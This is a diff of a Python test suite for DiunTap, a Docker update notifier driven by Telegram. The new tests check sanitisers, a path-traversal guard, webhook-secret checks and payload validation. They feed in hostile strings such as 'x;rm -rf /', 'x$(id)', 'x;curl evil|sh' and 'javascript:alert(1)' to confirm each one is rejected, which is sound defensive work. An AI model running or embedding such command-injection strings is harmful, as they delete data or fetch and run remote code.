@@ -1,21 +1,37 @@
-import os
-import json
+"""Extended test suite for the modular DiunTap.
+
+Covers legacy behaviour (parsing, mappings, formatter, i18n) plus the audit
+fixes: input sanitisation, Telegram De Morgan auth, webhook secret, opaque
+action store (no tag truncation), path-traversal guard, payload validation
+and bounded dedup cache.
+"""
+
 import asyncio
+import json
+import os
 import tempfile
 import unittest
 from pathlib import Path
 
-# Configure environment for testing before importing app
 os.environ["LANGUAGE"] = "en"
 os.environ["LOCAL_NODE_NAME"] = "TestNode"
 
-import app
-from app import parse_image_and_tag, find_targets_for_image, DiunWebhookPayload
-from mappings import resolve_github_repo, load_custom_mappings, DEFAULT_IMAGE_TO_GITHUB
+from dedup import DedupCache
 from i18n import t
+from mappings import DEFAULT_IMAGE_TO_GITHUB, load_custom_mappings, resolve_github_repo
+from models import ActionStore, DiunWebhookPayload, parse_image_and_tag, parse_legacy_callback
+from security import (
+    guard_stack_path,
+    is_telegram_user_allowed,
+    sanitize_service_name,
+    sanitize_stack_name,
+    sanitize_tag,
+    validate_github_repo,
+    verify_webhook_secret,
+)
 
 
-class TestDiunTap(unittest.TestCase):
+class TestParsing(unittest.TestCase):
     def test_parse_image_and_tag(self):
         img, tag = parse_image_and_tag("docker.io/deluan/navidrome:v0.55.0")
         self.assertEqual(img, "deluan/navidrome")
@@ -33,88 +49,234 @@ class TestDiunTap(unittest.TestCase):
         self.assertEqual(img, "ubuntu")
         self.assertEqual(tag, "22.04")
 
-        # Registry with port
         img, tag = parse_image_and_tag("local-registry.lan:5000/myteam/app:v1.2")
         self.assertEqual(img, "local-registry.lan:5000/myteam/app")
         self.assertEqual(tag, "v1.2")
 
-        # Registry with port and digest
         img, tag = parse_image_and_tag("local-registry.lan:5000/app:latest@sha256:abcdef")
         self.assertEqual(img, "local-registry.lan:5000/app")
         self.assertEqual(tag, "latest")
 
-        # Bare image name without tag
         img, tag = parse_image_and_tag("alpine")
         self.assertEqual(img, "alpine")
         self.assertEqual(tag, "latest")
 
-    def test_mappings_resolution(self):
-        # Known built-in mapping
+    def test_full_tag_preserved_no_truncation(self):
+        # Regression: legacy tag[:14] broke tags like v1.2.3-alpine / long semver.
+        img, tag = parse_image_and_tag("myorg/app:v1.2.3-alpine")
+        self.assertEqual(tag, "v1.2.3-alpine")
+        self.assertEqual(sanitize_tag(tag), "v1.2.3-alpine")
+
+        long_tag = "v" + "1" * 100
+        self.assertEqual(sanitize_tag(long_tag), long_tag)
+
+
+class TestMappingsResolution(unittest.TestCase):
+    def test_builtin_and_heuristics(self):
         repo = resolve_github_repo("deluan/navidrome", DEFAULT_IMAGE_TO_GITHUB)
         self.assertEqual(repo, "navidrome/navidrome")
 
-        # Strip registry
         repo2 = resolve_github_repo("docker.io/jellyfin/jellyfin", DEFAULT_IMAGE_TO_GITHUB)
         self.assertEqual(repo2, "jellyfin/jellyfin")
 
-        # Heuristic fallback for unknown repo in format owner/repo
         repo3 = resolve_github_repo("someuser/awesomeapp", DEFAULT_IMAGE_TO_GITHUB)
         self.assertEqual(repo3, "someuser/awesomeapp")
+
+        self.assertIsNone(resolve_github_repo("registry.example.com:5000/a/b/c", {}))
 
     def test_custom_mappings_file(self):
         with tempfile.NamedTemporaryFile("w+", suffix=".json", delete=False) as f:
             f.write(json.dumps({"custom/app": "customowner/customrepo"}))
             f_path = f.name
-
         try:
             custom_map = load_custom_mappings(f_path)
             self.assertEqual(custom_map.get("custom/app"), "customowner/customrepo")
-            # Defaults should still exist
             self.assertIn("deluan/navidrome", custom_map)
         finally:
             if os.path.exists(f_path):
                 os.remove(f_path)
 
-    def test_find_targets_local(self):
+
+class TestSecurity(unittest.TestCase):
+    def test_sanitize_stack_rejects_injection(self):
+        self.assertEqual(sanitize_stack_name("navidrome"), "navidrome")
+        for evil in ["../../etc", "a/b", "x;rm -rf /", "x$(id)", "x`id`",
+                     "x|y", "x&y", "", "..", "a b", "x\ny"]:
+            with self.assertRaises(Exception, msg=evil):
+                sanitize_stack_name(evil)
+
+    def test_sanitize_service_rejects_shell(self):
+        self.assertEqual(sanitize_service_name("jellyfin.service"), "jellyfin.service")
+        for evil in ["x;curl evil|sh", "x&&y", "x$y", "a/b", "x`id`", "x\ny"]:
+            with self.assertRaises(Exception, msg=evil):
+                sanitize_service_name(evil)
+
+    def test_sanitize_tag_rejects_shell(self):
+        self.assertEqual(sanitize_tag("v1.2.3-alpine"), "v1.2.3-alpine")
+        for evil in ["x;id", "a/b", "x$y", ""]:
+            if evil == "":
+                self.assertEqual(sanitize_tag(evil), "latest")
+            else:
+                with self.assertRaises(Exception, msg=evil):
+                    sanitize_tag(evil)
+
+    def test_guard_stack_path_blocks_traversal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            base = Path(tmp)
+            (base / "ok").mkdir()
+            self.assertEqual(guard_stack_path(base, "ok"), (base / "ok").resolve())
+            with self.assertRaises(Exception):
+                guard_stack_path(base, "../etc")
+            with self.assertRaises(Exception):
+                guard_stack_path(base, "a/b")
+
+    def test_github_repo_validation(self):
+        self.assertEqual(validate_github_repo("jellyfin/jellyfin"), "jellyfin/jellyfin")
+        for evil in ["https://evil/x", "a/b/c", "", "a", "a;b", "$(x)/y"]:
+            with self.assertRaises(Exception, msg=evil):
+                validate_github_repo(evil)
+
+    def test_telegram_auth_demorgan_fix(self):
+        allowed = ["111"]
+        # Only from_user.id matters now.
+        self.assertTrue(is_telegram_user_allowed(111, allowed))
+        self.assertTrue(is_telegram_user_allowed("111", allowed))
+        # Attacker with spoofed chat but foreign user id -> rejected,
+        # even if the chat id equals the allowed id (old OR-logic hole).
+        self.assertFalse(is_telegram_user_allowed(999, allowed))
+        self.assertFalse(is_telegram_user_allowed(None, allowed))
+        self.assertFalse(is_telegram_user_allowed(111, []))
+
+    def test_webhook_secret(self):
+        verify_webhook_secret("s3cret", "s3cret")  # no raise
+        verify_webhook_secret("", "")  # legacy mode: no raise
+        with self.assertRaises(Exception):
+            verify_webhook_secret("wrong", "s3cret")
+        with self.assertRaises(Exception):
+            verify_webhook_secret("", "s3cret")
+
+
+class TestActions(unittest.TestCase):
+    def test_opaque_store_roundtrip_full_tag(self):
+        store = ActionStore(ttl_seconds=60)
+        aid = store.register("upd", "loc", "navidrome", "v1.2.3-alpine", "hdr")
+        action = store.resolve(aid)
+        self.assertIsNotNone(action)
+        assert action is not None
+        self.assertEqual(action.target, "navidrome")
+        self.assertEqual(action.tag, "v1.2.3-alpine")  # never truncated
+        self.assertIsNone(store.resolve("nonexistent"))
+
+    def test_legacy_callback_parsing(self):
+        self.assertEqual(
+            parse_legacy_callback("upd:loc:navidrome:v1.0"),
+            ("upd", "loc", "navidrome", "v1.0"),
+        )
+        self.assertEqual(
+            parse_legacy_callback("rb:rem:svc:v2")[0:2], ("rb", "rem")
+        )
+        self.assertIsNone(parse_legacy_callback("hello"))
+        self.assertIsNone(parse_legacy_callback(""))
+
+
+class TestPayload(unittest.TestCase):
+    def test_valid_payload(self):
+        payload = DiunWebhookPayload(
+            image="docker.io/vaultwarden/server:latest",
+            status="update",
+            hub_link="https://hub.docker.com/r/vaultwarden/server",
+        )
+        self.assertEqual(payload.image, "docker.io/vaultwarden/server:latest")
+
+    def test_rejects_evil_image(self):
+        with self.assertRaises(Exception):
+            DiunWebhookPayload(image="x; rm -rf /", status="update")
+        with self.assertRaises(Exception):
+            DiunWebhookPayload(image="", status="update")
+
+    def test_rejects_non_http_hub_link(self):
+        with self.assertRaises(Exception):
+            DiunWebhookPayload(image="alpine:3", hub_link="javascript:alert(1)")
+
+
+class TestDedup(unittest.TestCase):
+    def test_duplicate_within_window(self):
+        async def go():
+            cache = DedupCache(maxsize=8, ttl=60)
+            self.assertFalse(await cache.check_and_mark("a"))
+            self.assertTrue(await cache.check_and_mark("a"))
+            self.assertFalse(await cache.check_and_mark("b"))
+        asyncio.run(go())
+
+    def test_bounded_size(self):
+        async def go():
+            cache = DedupCache(maxsize=4, ttl=60)
+            for i in range(10):
+                await cache.check_and_mark(f"k{i}")
+            self.assertLessEqual(len(cache._cache), 4)
+        asyncio.run(go())
+
+
+class TestFindTargetsLocal(unittest.TestCase):
+    def test_filesystem_scan(self):
+        from docker_local import _scan_stacks_sync
+
         with tempfile.TemporaryDirectory() as tmp_dir:
             tmp_path = Path(tmp_dir)
-
-            # Create mock stack 1: navidrome
             stack1 = tmp_path / "navidrome"
             stack1.mkdir()
-            (stack1 / "compose.yaml").write_text("services:\n  navidrome:\n    image: deluan/navidrome:latest\n")
-
-            # Create mock stack 2: jellyfin
+            (stack1 / "compose.yaml").write_text(
+                "services:\n  navidrome:\n    image: deluan/navidrome:latest\n"
+            )
             stack2 = tmp_path / "jellyfin"
             stack2.mkdir()
-            (stack2 / "docker-compose.yml").write_text("services:\n  jellyfin:\n    image: jellyfin/jellyfin:10.8.0\n")
+            (stack2 / "docker-compose.yml").write_text(
+                "services:\n  jellyfin:\n    image: jellyfin/jellyfin:10.8.0\n"
+            )
+            self.assertEqual(
+                _scan_stacks_sync(tmp_path, "deluan/navidrome", "navidrome"), "navidrome"
+            )
+            self.assertEqual(
+                _scan_stacks_sync(tmp_path, "jellyfin/jellyfin", "jellyfin"), "jellyfin"
+            )
+            self.assertIsNone(
+                _scan_stacks_sync(tmp_path, "nonexistent/service", "service")
+            )
 
-            # Patch DOCKER_STACKS_DIR
-            original_dir = app.DOCKER_STACKS_DIR
-            app.DOCKER_STACKS_DIR = tmp_path
+    def test_symlinked_stack_skipped(self):
+        from docker_local import _scan_stacks_sync
+
+        with tempfile.TemporaryDirectory() as tmp_dir, tempfile.TemporaryDirectory() as ext_dir:
+            tmp_path = Path(tmp_dir)
+            # Real content lives OUTSIDE the stacks dir; only a symlink points to it.
+            ext = Path(ext_dir) / "real"
+            ext.mkdir()
+            (ext / "compose.yaml").write_text(
+                "services:\n  x:\n    image: evil/img:latest\n"
+            )
+            link = tmp_path / "linkstack"
             try:
-                target_nav = asyncio.run(find_targets_for_image("deluan/navidrome"))
-                self.assertEqual(target_nav["local"], "navidrome")
+                link.symlink_to(ext, target_is_directory=True)
+            except OSError:
+                self.skipTest("symlinks not supported")
+            self.assertIsNone(_scan_stacks_sync(tmp_path, "evil/img", "img"))
 
-                target_jelly = asyncio.run(find_targets_for_image("jellyfin/jellyfin"))
-                self.assertEqual(target_jelly["local"], "jellyfin")
 
-                target_none = asyncio.run(find_targets_for_image("nonexistent/service"))
-                self.assertIsNone(target_none["local"])
-            finally:
-                app.DOCKER_STACKS_DIR = original_dir
-
+class TestFormatter(unittest.TestCase):
     def test_markdown_formatter(self):
         from formatters import format_markdown_for_telegram
+
         raw = "## Release 1.0\n* Feature A with [link](https://example.com)\n* **Fix B**"
         formatted = format_markdown_for_telegram(raw)
         self.assertTrue(formatted.startswith("<blockquote expandable>"))
         self.assertTrue(formatted.endswith("</blockquote>"))
         self.assertIn("<b>Release 1.0</b>", formatted)
-        self.assertIn("• Feature A with <a href=\"https://example.com\">link</a>", formatted)
+        self.assertIn('• Feature A with <a href="https://example.com">link</a>', formatted)
         self.assertIn("• <b>Fix B</b>", formatted)
 
-    def test_i18n_translation(self):
+
+class TestI18n(unittest.TestCase):
+    def test_translation_and_parity(self):
         msg = t("title_update")
         self.assertEqual(msg, "🚀 Container Update")
 
@@ -122,20 +284,12 @@ class TestDiunTap(unittest.TestCase):
         self.assertIn("HomeServer", msg_interp)
         self.assertIn("navidrome", msg_interp)
 
-        # Check all keys exist in both en and pl
         from i18n import STRINGS
-        self.assertEqual(set(STRINGS["en"].keys()), set(STRINGS["pl"].keys()))
 
-    def test_webhook_payload(self):
-        payload = DiunWebhookPayload(
-            image="docker.io/vaultwarden/server:latest",
-            status="update",
-            hub_link="https://hub.docker.com/r/vaultwarden/server"
-        )
-        self.assertEqual(payload.image, "docker.io/vaultwarden/server:latest")
-        self.assertEqual(payload.status, "update")
-        self.assertEqual(payload.hub_link, "https://hub.docker.com/r/vaultwarden/server")
+        self.assertEqual(set(STRINGS["en"].keys()), set(STRINGS["pl"].keys()))
+        self.assertIn("toast_already_running", STRINGS["en"])
+        self.assertIn("toast_already_running", STRINGS["pl"])
+
 
 if __name__ == "__main__":
     unittest.main()
-
